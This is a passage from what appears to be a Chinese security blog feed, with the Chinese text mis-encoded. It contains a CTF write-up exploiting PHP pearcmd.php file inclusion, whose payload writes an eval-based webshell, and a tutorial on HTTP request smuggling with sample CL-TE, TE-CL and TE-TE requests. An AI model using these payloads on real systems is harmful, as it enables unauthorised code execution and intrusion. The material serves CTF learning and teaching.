title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h1><p>ç›®æ ‡è£…äº†pearç»„ä»¶ï¼Œregister_argc_argvä¸ºOnï¼Œå¯ä»¥åŒ…å«åˆ°pearcmd.phpæ–‡ä»¶(ä¸å—open_basedirå’Œæ–‡ä»¶åç¼€é™åˆ¶)</p><h1 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h1><p>å½“æ–‡ä»¶åŒ…å«äº†pearcmd.phpæ—¶å°±ä¼šæ‰§è¡Œ$_SERVER[â€˜argvâ€™]ä¸­çš„å‘½ä»¤</p><h1 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h1><p>æ‰“å¼€ç¯å¢ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æç¤ºä¿¡æ¯phpinfo.php</p><p>è®¿é—®</p><p><img src="/../images/image-20231223164741894.png" alt="image-20231223164741894"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake&#123;Check_register_argc_argv&#125;</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹register_argc_argv</p><p><img src="/../images/image-20231223164815465.png" alt="image-20231223164815465"></p><p>ä¸ºOn</p><p>å°è¯•æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST[&#x27;a&#x27;])?&gt;+./a.php</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¦æ³¨æ„ï¼Œç›´æ¥getä¼ å‚urlä¼šæŠŠ&lt;ç­‰å­—ç¬¦è¿›è¡Œç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨burp</p><p><img src="/../images/image-20231223165900712.png" alt="image-20231223165900712"></p><p>ç›´æ¥è¯»flag</p><p><img src="/../images/image-20231223165945181.png" alt="image-20231223165945181"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pear&quot;&gt;&lt;a href=&quot;#pear&quot; class=&quot;headerlink&quot; title=&quot;pear&quot;&gt;&lt;/a&gt;pear&lt;/h1&gt;&lt;p&gt;pearå…¨ç§°PHP Extension and Application Reposition(phpæ‰©å±•å’Œåº”ç”¨ä»“åº“)ï¼Œåœ¨do</summary>
      
    
    
    
    
    <category term="ctf webå®‰å…¨" scheme="http://example.com/tags/ctf-web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>httpè¯·æ±‚èµ°ç§</title>
    <link href="http://example.com/2023/12/22/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>http://example.com/2023/12/22/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
    <published>2023-12-22T07:17:54.000Z</published>
    <updated>2023-12-22T07:26:55.618Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§"><a href="#ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§" class="headerlink" title="ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§"></a>ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§</h1><p>HTTPè¯·æ±‚èµ°ç§æ˜¯ä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†ä»ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·æ¥æ”¶çš„HTTPè¯·æ±‚åºåˆ—æ–¹å¼çš„æŠ€æœ¯ã€‚</p><p>æ”»å‡»è€…å¯ä»¥ç»•è¿‡å®‰å…¨æ§åˆ¶ï¼Œæœªç»æˆæƒç›´æ¥è®¿é—®æ•æ„Ÿæ•°æ®ã€‚</p><h1 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h1><h2 id="keep-aliveä¸pipeline"><a href="#keep-aliveä¸pipeline" class="headerlink" title="keep-aliveä¸pipeline"></a>keep-aliveä¸pipeline</h2><p>ä¸ºäº†ç¼“è§£æºç«™çš„å‹åŠ›ï¼Œä¸€èˆ¬ä¼šåœ¨ç”¨æˆ·å’Œåç«¯æœåŠ¡å™¨ä¹‹é—´åŠ è®¾å‰ç½®æœåŠ¡å™¨ï¼Œç”¨ä»¥ç¼“å­˜ã€ç®€å•æ ¡éªŒã€è´Ÿè½½å‡è¡¡ç­‰ï¼Œè€Œå‰ç½®æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨å¾€å¾€æ˜¯åœ¨å¯é çš„ç½‘ç»œåŸŸä¸­ï¼Œipä¹Ÿæ˜¯ç›¸å¯¹å›ºå®šçš„ï¼Œæ‰€ä»¥å¯ä»¥é‡ç”¨TCPè¿æ¥æ¥å‡å°‘é¢‘ç¹TCPæ¡æ‰‹å¸¦æ¥çš„å¼€é”€ï¼Œè¿™å°±ç”¨åˆ°äº†HTTP1.1ä¸­çš„<strong>keep-alive</strong>å’Œ<strong>pipeline</strong>ç‰¹æ€§</p><ul><li>keep-alive:åœ¨HTTPè¯·æ±‚ä¸­å¢åŠ ä¸€ä¸ªç‰¹æ®Šçš„è¯·æ±‚å¤´Connection:keep-aliveï¼Œå‘Šè¯‰æœåŠ¡å™¨æ¥æ”¶å®Œè¿™æ¬¡HTTPè¯·æ±‚åï¼Œä¸è¦å…³é—­TCPé“¾æ¥ï¼Œä»¥ä¾¿äºåé¢å¯¹ç›¸åŒæœåŠ¡å™¨è¯·æ±‚æ—¶é‡ç”¨è¿™ä¸€ä¸ªTCPé“¾æ¥ã€‚è¿™æ ·ä¸€æ¥åªéœ€è¦è¿›è¡Œä¸€æ¬¡TCPæ¡æ‰‹ï¼Œå‡å°‘äº†æœåŠ¡å™¨çš„å¼€é”€ï¼Œè¿™ä¸ªç‰¹æ€§åœ¨HTTP1.1ä¸­é»˜è®¤å¼€å¯ã€‚</li><li>pipeline:åŸºäºkeep-aliveå®ç°ï¼Œå®¢æˆ·ç«¯å¯ä»¥åƒæµæ°´çº¿ä¸€æ ·å‘é€è‡ªå·±çš„HTTPè¯·æ±‚ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨çš„å“åº”ã€‚æœåŠ¡å™¨æ¥æ”¶è¯·æ±‚åï¼Œéœ€è¦éµå¾ªå…ˆå…¥åå‡ºæœºåˆ¶ï¼Œå°†è¯·æ±‚å’Œå“åº”ä¸¥æ ¼å¯¹åº”ï¼Œå†å°†å“åº”å‘é€ç»™å®¢æˆ·ç«¯ã€‚ç›®å‰æµè§ˆå™¨é»˜è®¤ä¸å¼€å¯pipelineï¼Œä½†ä¸€èˆ¬æœåŠ¡å™¨éƒ½æ”¯æŒã€‚</li></ul><p>æ­£å¸¸æƒ…å†µä¸‹çš„HTTPè¯·æ±‚:</p><p><img src="/../images/image-20231222152631080.png" alt="image-20231222152631080"></p><p>å‰ç½®æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨åº”å½“åœ¨HTTPè¯·æ±‚çš„è¾¹ç•Œåˆ’åˆ†ä¸Šè¾¾æˆä¸€è‡´ï¼Œå¦åˆ™ä¼šå¯¼è‡´å¼‚å¸¸</p><p><img src="/../images/image-20231222152650380.png" alt="image-20231222152650380"> </p><h2 id="èµ°ç§æ”»å‡»å®ç°"><a href="#èµ°ç§æ”»å‡»å®ç°" class="headerlink" title="èµ°ç§æ”»å‡»å®ç°"></a>èµ°ç§æ”»å‡»å®ç°</h2><p>å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨å®ç°æ–¹å¼ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªæ­£å¸¸çš„HTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ã€‚ä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„å¦ä¸€éƒ¨åˆ†åˆ™æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¿™éƒ¨åˆ†è¯·æ±‚å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆå½±å“åï¼Œå°±å®ç°äº†HTTPè¯·æ±‚èµ°ç§æ”»å‡»ã€‚</p><h2 id="CLä¸TE"><a href="#CLä¸TE" class="headerlink" title="CLä¸TE"></a>CLä¸TE</h2><p>CLï¼š<strong>Content-Length</strong></p><p>TEï¼š<strong>Transfer-Encoding</strong></p><p><strong>Transfer-Encoding</strong>æŒ‡å®šç”¨äºä¼ è¾“è¯·æ±‚ä¸»ä½“çš„ç¼–ç æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨çš„å€¼æœ‰chunked,compress,deflate,gzip,identity</p><p>è®¾ç½®äº†<strong>Transfer-Encoding: chunked</strong>åï¼Œè¯·æ±‚ä¸»ä½“æŒ‰ä¸€ç³»åˆ—å—çš„å½¢å¼å‘é€ï¼Œå¹¶çœç•¥<strong>Content-Length</strong>ã€‚åœ¨æ¯ä¸ªå—çš„å¼€å¤´éœ€è¦ä½¿ç”¨åå…­è¿›åˆ¶æ•°çŸ¥åå½“å‰å—çš„é•¿åº¦ï¼Œæ•°å€¼åæ¥<strong>\r\n</strong>(ä¸¤ä¸ªå­—èŠ‚)ï¼Œå†æ¥<strong>\r\n</strong>è¡¨ç¤ºæ­¤å—çš„ç»“æŸã€‚æœ€åä½¿ç”¨é•¿åº¦ä¸º0çš„å—è¡¨ç¤ºç»ˆæ­¢å—ã€‚ç»ˆæ­¢å—åæ˜¯ä¸€ä¸ªtralierï¼Œç”±0æˆ–å¤šä¸ªå®ä½“å¤´ç»„æˆ ï¼Œå¯ä»¥ç”¨æ¥å­˜æ”¾å¯¹æ•°æ®çš„æ•°å­—ç­¾åã€‚</p><p>ä¾‹å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 1.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line">6</span><br><span class="line">hahaha</span><br><span class="line">0</span><br><span class="line">[ç©ºç™½è¡Œ]</span><br><span class="line">[ç©ºç™½è¡Œ]</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong></p><ul><li><strong>Content-Length</strong>éœ€è¦å°†è¯·æ±‚ä¸»ä½“ä¸­çš„<strong>\r\n</strong>æ‰€å çš„ä¸¤ä¸ªå­—èŠ‚è®¡ç®—åœ¨å†…ï¼Œè€Œå—é•¿åº¦è¦å¿½ç•¥å—å†…å®¹è¡¨ç¤ºç»ˆæ­¢çš„<strong>\r\n</strong></li><li>è¯·æ±‚å¤´ä¸è¯·æ±‚ä¸»ä½“ä¹‹é—´æœ‰ä¸€ä¸ªç©ºè¡Œï¼Œæ˜¯è§„èŒƒè¦æ±‚çš„ç»“æ„ï¼Œä¸è®¡å…¥<strong>Content-Length</strong></li></ul><h1 id="èµ°ç§æ–¹å¼"><a href="#èµ°ç§æ–¹å¼" class="headerlink" title="èµ°ç§æ–¹å¼"></a>èµ°ç§æ–¹å¼</h1><p>HTTPè¯·æ±‚èµ°ç§æ”»å‡»æ¶‰åŠå°†<strong>Content-Length</strong>æ ‡å¤´å’Œ<strong>Transfer-Encoding</strong>æ ‡å¤´éƒ½æ”¾ç½®åœ¨å•ä¸ªHTTPè¯·æ±‚ä¸­å¹¶è¿›è¡Œå¤„ç†ï¼Œä»¥ä¾¿å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†è¯·æ±‚ã€‚</p><ul><li><p>CL.TEï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´</p></li><li><p>TE.CLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´</p></li><li><p>TE.TEï¼šå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encodingæ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å¯¹æ ‡å¤´è¿›è¡ŒæŸç§æ–¹å¼çš„æ··æ·†æ¥è¯±å¯¼å…¶ä¸­ä¸€å°æœåŠ¡å™¨ä¸å¯¹å…¶è¿›è¡Œå¤„ç†</p></li></ul><h2 id="CLä¸ä¸º0"><a href="#CLä¸ä¸º0" class="headerlink" title="CLä¸ä¸º0"></a>CLä¸ä¸º0</h2><p>æ‰€æœ‰ä¸æºå¸¦è¯·æ±‚ä½“çš„HTTPè¯·æ±‚éƒ½æœ‰å¯èƒ½å—æ­¤å½±å“ã€‚</p><p>å‰ç«¯æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¸å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥GETè¯·æ±‚ä¸­çš„<strong>Content-Length</strong>å¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹ï¼š</strong></p><p>å‰ç«¯æœåŠ¡å™¨æ”¶åˆ°è¯¥è¯·æ±‚ï¼Œè¯»å–<strong>Content-Length</strong>ï¼Œåˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œè½¬å‘ç»™åç«¯æœåŠ¡å™¨</p><p>è€Œåç«¯æœåŠ¡å™¨ä¸å¯¹<strong>Content-Length</strong>ä½œå¤„ç†ï¼Œç”±äºpipelineå­˜åœ¨ï¼Œåç«¯æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªè¯·æ±‚</p><p>1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><p>2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><h2 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h2><p><strong>RFC7320è§„èŒƒ</strong></p><p>è§„å®šå½“æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ä¸­åŒ…å«ä¸¤ä¸ªContent-Lengthè€Œä¸”ä¸¤è€…çš„å€¼ä¸åŒæ—¶ï¼Œéœ€è¦è¿”å›400é”™è¯¯</p><p>æœ‰äº›æœåŠ¡å™¨ä¸ä¼šä¸¥æ ¼å®ç°è¯¥è§„èŒƒï¼Œå‡è®¾ä¸­é—´çš„ä»£ç†æœåŠ¡å™¨å’Œåç«¯çš„æºæœåŠ¡å™¨åœ¨æ”¶åˆ°ç±»ä¼¼è¯·æ±‚æ—¶ï¼Œéƒ½ä¸ä¼šè¿”å›400ï¼Œä½†æ˜¯ä¸­é—´ä»£ç†æœåŠ¡å™¨æŒ‰ç…§ç¬¬ä¸€ä¸ªContent-Lengthçš„å€¼å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè€Œåç«¯æºæœåŠ¡å™¨æŒ‰ç…§ç¬¬äºŒä¸ªContent-Lengthçš„å€¼è¿›è¡Œå¤„ç†</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹ï¼š</strong></p><p>ä¸­é—´ä»£ç†æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…çš„é•¿åº¦ä¸º8ï¼Œç„¶åè½¬å‘ç»™åç«¯æºç«™æœåŠ¡å™¨</p><p>è€Œåç«¯æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…é•¿åº¦ä¸º7ï¼Œåç«¯æœåŠ¡å™¨è®¤ä¸ºå·²ç»è¯»å–å®Œæ¯•ï¼Œç„¶åç”Ÿæˆå“åº”</p><p>è€Œæ­¤æ—¶çš„ç¼“å†²åŒºè¿˜å‰©ä½™ä¸€ä¸ªå­—æ¯aï¼Œå¯¹äºåç«¯æœåŠ¡å™¨æ¥è¯´è¿™ä¸ªaæ˜¯ä¸‹ä¸€ä¸ªè¯·æ±‚çš„ä¸€éƒ¨åˆ†</p><p>å¦‚æœæ­¤æ—¶å¦ä¸€ç”¨æˆ·å‘é€è¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><p>å› ä¸ºä»£ç†æœåŠ¡å™¨å’ŒæºæœåŠ¡å™¨ä¹‹é—´é‡ç”¨TCPé“¾æ¥ï¼Œé‚£ä¹ˆaä¼šæ‹¼æ¥åˆ°è¿™ä¸ªè¯·æ±‚å‰é¢</p><p>å®é™…è¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å®ç°äº†ä¸€æ¬¡HTTPèµ°ç§æ”»å‡»ï¼Œè€Œä¸”è¿˜å¯ä»¥æ‰©å±•æˆç±»ä¼¼CSRFçš„æ”»å‡»æ–¹å¼</p><p>ä¸€èˆ¬æœåŠ¡å™¨éƒ½ä¸ä¼šæ¥æ”¶è¿™ç§å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚æ–¹å¼ï¼Œä½†æ˜¯</p><p><strong>RFC2616è§„èŒƒ</strong></p><p>å¦‚æœæ”¶åˆ°åŒæ—¶å­˜åœ¨Content-Lengthå’ŒTransfer-Encodingè¿™ä¸¤ä¸ªè¯·æ±‚åŒ…æ—¶ï¼Œå¿…é¡»å¿½ç•¥Content-Length</p><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><p>å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯æœåŠ¡å™¨åªå¤„ç†Content-Lengthè¯·æ±‚å¤´ï¼Œåç«¯æœåŠ¡å™¨éµå®ˆRFC2616è§„å®šï¼Œå¿½ç•¥Content-Lengthï¼Œåªå¤„ç†Transfer-Encoding</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹</strong></p><p>å‰ç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œè¯·æ±‚ä½“é•¿åº¦ä¸º6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>è€Œåç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œå½“å®ƒè¯»åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºå·²ç»ç»“æŸ</p><p>aç•™åœ¨äº†ç¼“å†²åŒºï¼Œä¼šæ‹¼æ¥åˆ°ä¸‹ä¸€æ¬¡è¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨è§£ææ—¶ä¼šæŠ¥é”™ï¼Œé€ æˆè¯·æ±‚èµ°ç§</p><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><p>å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œåç«¯æœåŠ¡å™¨å¤„ç†Content-Length</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>å‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œå½“è¯»åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºè¯»å–å®Œæ¯•ï¼Œè½¬å‘ç»™åç«¯æœåŠ¡å™¨</p><p>åç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthï¼Œè¯»å®Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºè¯·æ±‚ç»“æŸï¼Œåé¢æ•°æ®è®¤ä¸ºæ˜¯ä¸‹ä¸€ä¸ªè¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>é€ æˆè¯·æ±‚èµ°ç§</p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚åŒ…æ—¶ï¼Œå‰åç«¯æœåŠ¡å™¨éƒ½å¤„ç†Transfer-Encodingè¯·æ±‚å¤´ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å¯¹å‘é€çš„è¯·æ±‚åŒ…ä¸­çš„Transfer-Encodingè¿›è¡ŒæŸç§æ··æ·†æ“ä½œï¼Œä½¿å¾—å¦ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†TEï¼Œåœ¨æŸç§æ„ä¹‰ä¸Šè¿˜æ˜¯CL-TEæˆ–TE-CL</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹ï¼š</strong></p><p>å‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œè¯»åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span 